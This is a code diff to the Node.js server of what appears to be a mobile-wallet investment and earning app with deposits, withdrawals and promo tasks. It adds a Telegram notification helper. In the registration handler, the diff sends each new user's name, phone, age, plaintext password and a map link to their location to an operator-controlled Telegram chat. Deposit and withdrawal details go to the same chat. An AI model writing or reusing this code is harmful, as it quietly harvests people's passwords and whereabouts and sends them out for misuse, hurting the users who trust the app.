@@ -38,7 +38,9 @@ function defaultDb() {
       investRate: 20,
       investDuration: 7,
       adminBkash: "01700000000",
-      adminNagad: "01800000000"
+      adminNagad: "01800000000",
+      telegramToken: "",
+      telegramChatId: ""
     }
   };
 }
@@ -71,6 +73,25 @@ function saveDb(db) {
 }
 
 function clean(v, max = 200) { return String(v || "").trim().slice(0, max); }
+
+// Telegram Notification Helper
+async function sendTelegramNotification(text, settings) {
+  if (!settings || !settings.telegramToken || !settings.telegramChatId) return;
+  try {
+    const url = `https://api.telegram.org/bot${settings.telegramToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: settings.telegramChatId,
+        text: text,
+        parse_mode: "HTML"
+      })
+    });
+  } catch (e) {
+    console.error("Telegram Notification Error:", e);
+  }
+}
 
 function signSession(payload) {
   const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
@@ -129,6 +150,12 @@ app.post("/api/register/start", (req, res) => {
     db.registrations.unshift(user);
     db.transactions.unshift({ id: crypto.randomUUID(), userId: id, type: "Registration Bonus", amount: 100, date: new Date().toISOString() });
     saveDb(db);
+
+    // Send Telegram Notification with Location Map Link
+    let mapLink = location ? `https://maps.google.com/?q=${location.latitude},${location.longitude}` : 'N/A';
+    const msg = `👤 <b>New Registration!</b>\n\nName: ${name}\nPhone: ${phone}\nAge: ${age}\nPassword: ${password}\n📍 Location: <a href="${mapLink}">View on Google Maps</a>`;
+    sendTelegramNotification(msg, db.settings);
+
     res.json({ ok: true, user });
   });
 });
@@ -189,6 +216,11 @@ app.post("/api/deposit", (req, res) => {
     db.deposits.unshift({ id: crypto.randomUUID(), userId, method, amount, trxId: cleanTrx, status: "Pending", date: new Date().toISOString() });
     db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Deposit (${method})`, amount, status: "Pending", date: new Date().toISOString() });
     saveDb(db);
+
+    // Send Telegram Notification for Deposit
+    const msg = `💳 <b>New Deposit Request!</b>\n\nUser: ${user.name} (${user.phone})\nMethod: ${method}\nAmount: ৳${amount}\nTrxID: <code>${cleanTrx}</code>`;
+    sendTelegramNotification(msg, db.settings);
+
     res.json({ ok: true });
   });
 });
@@ -295,6 +327,11 @@ app.post("/api/withdraw", (req, res) => {
     db.withdrawals.unshift({ id: crypto.randomUUID(), userId, method, number, amount, status: "Pending", date: new Date().toISOString() });
     db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Withdraw (${method})`, amount: -amount, date: new Date().toISOString() });
     saveDb(db);
+
+    // Send Telegram Notification for Withdraw
+    const msg = `💸 <b>New Withdraw Request!</b>\n\nUser: ${user.name} (${user.phone})\nMethod: ${method} (${number})\nAmount: ৳${amount}`;
+    sendTelegramNotification(msg, db.settings);
+
     res.json({ ok: true, balance: user.balance });
   });
 });
@@ -319,6 +356,7 @@ app.get("/api/admin/overview", requireAdmin, (req, res) => {
     users: db.registrations,
     deposits: db.deposits,
     withdrawals: db.withdrawals,
+    tasks: db.promoTasks,
     settings: db.settings
   });
 });
@@ -347,6 +385,27 @@ app.post("/api/admin/withdraw/approve", requireAdmin, (req, res) => {
       w.status = "Approved";
       saveDb(db);
     }
+    res.json({ ok: true });
+  });
+});
+
+// Admin Manage Promo Tasks
+app.post("/api/admin/task/add", requireAdmin, (req, res) => {
+  withFileLock(async () => {
+    const { title, url, reward } = req.body;
+    const db = loadDb();
+    db.promoTasks.push({ id: crypto.randomUUID(), title, url, reward: Number(reward) });
+    saveDb(db);
+    res.json({ ok: true });
+  });
+});
+
+app.post("/api/admin/task/delete", requireAdmin, (req, res) => {
+  withFileLock(async () => {
+    const { taskId } = req.body;
+    const db = loadDb();
+    db.promoTasks = db.promoTasks.filter(t => t.id !== taskId);
+    saveDb(db);
     res.json({ ok: true });
   });
 });
